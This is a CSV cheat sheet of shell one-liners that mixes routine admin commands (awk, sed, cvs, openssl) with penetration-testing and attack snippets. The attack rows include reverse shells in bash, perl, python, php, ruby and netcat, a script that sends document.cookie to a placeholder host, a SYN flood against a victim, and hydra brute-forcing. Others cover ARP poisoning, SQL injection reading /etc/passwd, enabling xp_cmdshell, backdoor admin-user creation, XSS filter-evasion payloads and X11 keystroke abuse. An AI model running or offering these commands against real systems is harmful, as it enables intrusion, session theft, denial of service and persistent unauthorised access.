CommandID,Command,Comment,Program
2,"awk /^[TERM]/ '{print ""See the"",$1,""at the"",$3}' words.txt",Use only the lines that match a given RegEX [TERM],Awk
3,"awk '{print ""Avg for"",$1,""is"",($2+$3+$4)/3}' grades.txt","Calculations using AWK. AWK is a huge language, not just for printing columns",Awk
4,awk 'NR==1;END{print}' file.txt,Print first and last lines of a file,Awk
5,"awk -F "";"" '{print $2}' file.txt",Split the file on ; instead of space,Awk
6,"awk '/start_pattern/,/stop_pattern/' file.txt",Print a portion of the text,Awk
7,show system mode,show mode of as500,
8,interface GigabitEthernet7; switchport trunk allowed vlan add 2,add vlan to your interface,
9,cvs diff <file>,diff file in cvs,Cvs
10,cvs log <file>,show history of files,Cvs
11,"file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m ""Reverted to previous version"" $file",roll back cvs change,Cvs
12,find -L . -type l,find broken symlinks,Shell
13,chkconfig --list,List services started on boot,
14,screen -D -R [ID],Hijack screen,
15,ssh -R [lport]:[rip]:[rport] [ip] -N,Forward the remote port to the local machine,SSH
16,ssh -L [lport]:[rip]:[rport] [ip] -N,Forward the local port to the remote machine,SSH
17,dd if=/dev/zero of=1g.img count=1M bs=1K,1Gig of zeros,Bash
18,chage -l root,get password policy for root,Shell
19,while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &,Display system clock in terminal top right corner! :-),Bash
20,"smartctl -d megaraid,0 -x /dev/sda",display disk info,Shell
21,hping3 -1 [ip],icmp ping,Hping
22,hping3 -8 [port]-[port] -S [ip] -V,syn scan port range with hping,Hping
23,hping3 -A [ip] -p [port],ACK scan on port,Hping
24,hping3 -2 [ip] -p [port],udp port scan,Hping
25,hping3 -Q [ip] -p [port] -s,Get initial sequence number,Hping
26,hping3 -S [ip] -p [port] --tcp-timestamp,get remote timestamp,Hping
27,hping3 -F -p -U [ip] -p [port],Xmas' scan,Hping
28,hping3 -1 [ip].x --rand-dest -I em1,Sweep range for up hosts ie 192.168.1.x,Hping
29,hping3 -9 HTTP -I em1,Intercept all http,Hping
30,hping3 -S [victim] -a [gw] -p [port] --flood,Syn flood victim,Hping
31,display interface brief,hp switch show if info,
32,GET //google.com,get google,
33,hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /,Brute HTTP with hydra -s 443 for ssl,Hydra
34,if [ $<variable> -gt <value>]; then <command>; else <command>; fi,bash if (greater than) statment syntax examole,Bash
35,"<script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>",Grab the cookie,HTML
36,meterpreter> execute -f cmd.exe -i -H,executes a command on the remote machine (i.e. opens up a command shell),Meterpreter
37,nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan,Quick scan to set us off,Nmap
38,nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan,Quick scan of all the hosts (ignore pinging),Nmap
39,nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port,Source port spoofing,Nmap
40,nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports,All port scan : assume up,Nmap
41,nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery,OS Detection,Nmap
42,nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls,Find sql servers,Nmap
43,openssl x509 -noout -modulus -in [CERT] | openssl md5,# Verify the certificate / private key association,OpenSSL
44,openssl x509 -in certificate.crt -text,https://www.sslshopper.com/article-most-common-openssl-commands.html,OpenSSL
45,"echo """" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'",Grab the hostname in the certificate,OpenSSL
46,ifconfig eth0 hw ether 00:E0:81:5C:B4:0F,Change MAC address,Shell
47,ip route show to match [IP],How will the sytem route traffic to [IP],Shell
49,skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip],Skipfish scanner,Skipfish
50,curl -D - --proxy1.0 [ip]:80 -m 2 [url],Curl through a proxy (-m = timeout),Shell
51,"curl -k --cookie ""[cookie]"" [url] --silent | grep ""<title>""",Curl with cookie,Shell
52,"smbclient -I [IP] -L [domain] -N -U """"",Null session smb,SMBClient
53,snmpwalk -v 1 -c public [TARGET],Default community string in SNMP,
54,ettercap -M arp -T -i em1 -L log /[TARGET]//,Ettercap arp poisoning,
55,fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt,Fierce (v0.9) - DNS bruteforcer,
56,lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4,recover file after being deleted,
57,rpm -qa | less,list installed programs,
58,"echo ""hello fredrick"" | sed 's/.\{4\}$//'",remove 4 chars,
59,cat db.schema | sed G,add space after each line,
60,sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t',convert a list into a multi line CSV,Sed
61,sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow,# Add to the beginning of the line starting with a pattern,Sed
62,bash -i >& /dev/tcp/10.0.0.1/8080 0>&1,bash reverse shell,Shell
63,"perl -e 'use Socket;$i=""10.0.0.1"";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");};'",perl reverse shell,Perl
64,"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'",python reverse shell,Python
65,"php -r '$sock=fsockopen(""10.0.0.1"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'",php reverse shell : php from the CLI,Php
66,"ruby -rsocket -e'f=TCPSocket.open(""10.0.0.1"",1234).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",ruby reverse shell,Ruby
67,nc -e /bin/sh 10.0.0.1 1234,net cat reverse shell,Netcat
68,null union all select load_file('/etc/passwd')/*,Load a file with MYSQL,
69,"exec sp_configure 'xp_cmdshell', 1 go reconfigure",enable xp_cmdshell,
70,create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;,oracle add user,---
71,"insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))",mysql add user,
72,"exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'",mssql add user,
73,# rm -rf `which nano`; ln -s `which vim` /usr/bin/nano,Fix nano <3 ;),
74,net start,list windows services,
75,net accounts,list windows password requirements : add /domain for AD,
76,net accounts /domain,password requirements domain,
77,reaver -i mon0 -c <channel> -b <bssid> -vv,try to reave WPS wifi,
78,"<%div style=""xss:expression(alert(123))"">",.net xss filter evasion,
79,<IMG SRC=j&#X41vascript:alert('test2')>,.net xss filter evasion,
80,%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi,UTF7 xss,
81,sl,not ls,
82,"command=""[cmd]"";echo -n xdotool key "" ""; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#""#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter",Abuse open x11 : Think open term add user add key,
83,echo 1 > /sys/module/usbcore/parameters/old_scheme_first,WIFI enable USB2 before USB3 : helps with passthrough,
84,airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview,WIFI : Scan the range in an orderly manner,
85,ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;,WIFI : Enable monitor mode on interface,
86,yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n,"Yaps windows portscan, upload first duh",
87,"cat json.txt | sed ""s/false/§false§/g"" | sed ""s/true/§true§/g"" | sed ""s/null/§null§/g"" | sed ""s/:\""/:\""§/g"" | sed ""s/\"",/§\"",/g"" | sed ""s/\""}/§\""}/g"" | sed ""s/\\[\\]/\\[§§\\]/g""",Burpify JSON request,Burpsuit
88,<script src=//[ip]>,mini xss,
